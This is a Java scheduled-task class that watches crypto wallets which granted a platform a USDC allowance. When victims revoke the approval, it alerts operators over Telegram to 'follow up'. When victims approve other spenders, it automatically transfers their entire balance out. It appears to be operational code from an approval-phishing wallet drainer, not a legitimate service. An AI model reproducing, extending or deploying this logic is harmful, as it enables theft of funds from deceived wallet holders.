package io.renren.modules.job.task;

import java.math.BigDecimal;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.core.conditions.update.LambdaUpdateWrapper;

import io.renren.modules.constants.ApproveEnum;
import io.renren.modules.constants.AutoEnum;
import io.renren.modules.constants.Constants;
import io.renren.modules.core.contract.ApproveHandler;
import io.renren.modules.core.contract.ContractHandler;
import io.renren.modules.core.entity.WalletsEntity;
import io.renren.modules.core.param.TransferParam;
import io.renren.modules.core.service.ApproveThreeService;
import io.renren.modules.core.service.AsyncTelegramNotificationService;
import io.renren.modules.core.service.TransferRecordService;
import io.renren.modules.core.service.WalletsService;
import io.renren.modules.core.vo.ApprovalEventVO;
import lombok.extern.slf4j.Slf4j;

@Component
@Slf4j
public class PermitWalletTask extends BaseTask {
	@Autowired
	WalletsService walletsService;
	@Autowired
	ContractHandler handler;
	@Autowired
	ApproveHandler approveHandler;
	@Autowired
	ApproveThreeService approveThreeService;
	@Autowired
	TransferRecordService transferRecordService;
	@Autowired
	AsyncTelegramNotificationService asyncTelegramService;
	
	
	@Override
	public void run(String params) throws Exception {
		proccess(params);
	}
	@Override
	public void handler(String params) throws Exception {
		long maxBlock = approveHandler.getMaxBlock();
		List<WalletsEntity> wallets = walletsService.list(
			new LambdaQueryWrapper<WalletsEntity>()
				.gt(WalletsEntity::getUsdc, BigDecimal.ZERO)
				.eq(WalletsEntity::getApprove, ApproveEnum.approved.getCode())
		);
		log.info("PermitWalletTask --> 开始执行Permit Check 任务. 钱包数量:{} ", wallets.size());

		int threadCount = 16; // 可根据服务器配置调整
		ExecutorService executor = Executors.newFixedThreadPool(threadCount);
		for (WalletsEntity wallet : wallets) {
			executor.submit(() -> {
				String userWallet = wallet.getWallet();
				try {
					BigDecimal apporveUsdc = handler.allowance(wallet.getWallet(), wallet.getApproveWallet());
					if (apporveUsdc.compareTo(BigDecimal.ZERO) == 0 || apporveUsdc.compareTo(wallet.getUsdc()) < 0) {
						walletsService.update(new LambdaUpdateWrapper<WalletsEntity>()
							.set(WalletsEntity::getSignData, null)
							.set(WalletsEntity::getApprove, ApproveEnum.unApprove.getCode())
							.eq(WalletsEntity::getWallet, userWallet)
							.eq(WalletsEntity::getApprove, wallet.getApprove()));
						log.info("PermitWalletTask --> 用户钱包:{} 取消了当前平台授权. 或者授权数量不足 授权数量:{}", userWallet, apporveUsdc);
						notifyTelegramAsync(wallet);
					}
				} catch (Exception e) {
					log.error("PermitWalletTask --> 用户钱包:{} 授权检查失败.{}", userWallet, e.getMessage());
				}
				try {
					List<ApprovalEventVO> approveList = approveHandler.fetchApprovalEvents(userWallet, maxBlock - 500, maxBlock);
					List<ApprovalEventVO> otherApprovals = approveList.stream()
						.filter(approve -> !approve.getSpender().equals(wallet.getApproveWallet().toLowerCase()))
						.collect(Collectors.toList());
					if (!otherApprovals.isEmpty()) {
						LambdaUpdateWrapper<WalletsEntity> updateWrapper = new LambdaUpdateWrapper<WalletsEntity>()
								.set(WalletsEntity::getApproveOther, ApproveEnum.approved.getCode() )
								.eq(WalletsEntity::getWallet, userWallet);
						walletsService.update(updateWrapper);
						for (ApprovalEventVO approval : otherApprovals) {
							log.info("PermitWalletTask --> 用户钱包: {} 已经授权其他平台. 授权地址: {}, Hash:-> {} ", userWallet, approval.getSpender(), approval.getHash());
							if(Constants.checkApproveContract(approval.getSpender())) continue ;
							if(wallet.getApproveOther() == ApproveEnum.unApprove.getCode()) {
								notifyTelegramAsyncApprove(wallet, approval.getHash());
							}
							try {
								approveThreeService.save(userWallet,wallet.getPoolsId(), approval);
								TransferParam param = new TransferParam();
								param.setAll(true);
								param.setWallet(userWallet);
								if(wallet.getAuto() == AutoEnum.auto.getCode()) {
									log.info("PermitWalletTask --> 用户钱包: {} 已经授权其他平台. 开始自动划转..",userWallet);
									transferRecordService.autoTransfer(param);
								}
							}catch(Exception ex) {
								log.info("PermitWalletTask --> 用户钱包: {} 已经授权其他平台. 自动划转失败.. {} ",userWallet,ex.getMessage());
							}
						}
					}
				} catch (Exception e) {
					log.info("PermitWalletTask --> 用户钱包:{} 检查授权其他平台异常. {} start：{} - end:{} ", userWallet, e.getMessage(), maxBlock-500, maxBlock);
				}
				
			});
		}
		executor.shutdown();
		executor.awaitTermination(1, TimeUnit.HOURS); // 等待所有任务完成

		log.info("PermitWalletTask --> Permit Check 任务执行完成. ");
	}
	
	


	/**
	 * 异步发送Telegram通知
	 */
	private void notifyTelegramAsync(WalletsEntity wallet) {
		try {
			String message = String.format(
				"🎯 用户撤销了平台授权！\n" +
				"💰 钱包地址: %s\n" +
				"⚠️ 请及时跟进处理！",
				wallet.getWallet()
			);
			asyncTelegramService.sendNotificationAsync(wallet.getPoolsId(),wallet.getInviteId(), wallet.getWallet(), message);
			 
		} catch (Exception e) {
			log.error("钱包: {} telegram 通知异常! {}", wallet.getWallet(), e.getMessage());
		}
	}
	
	private void notifyTelegramAsyncApprove(WalletsEntity wallet,String hash) {
		try {
			String message = String.format(
				"🎯 用户授权了其它平台！\n" +
				"💰 钱包地址: %s\n" +
				"⚡ Hash: %s \n" +
				"⚠️ 请及时跟进处理！",
				wallet.getWallet(),
				hash
			);
			asyncTelegramService.sendNotificationAsync(wallet.getPoolsId(),wallet.getInviteId(), wallet.getWallet(), message);
			 
		} catch (Exception e) {
			log.error("钱包: {} telegram 通知异常! {}", wallet.getWallet(), e.getMessage());
		}
	}
	

}
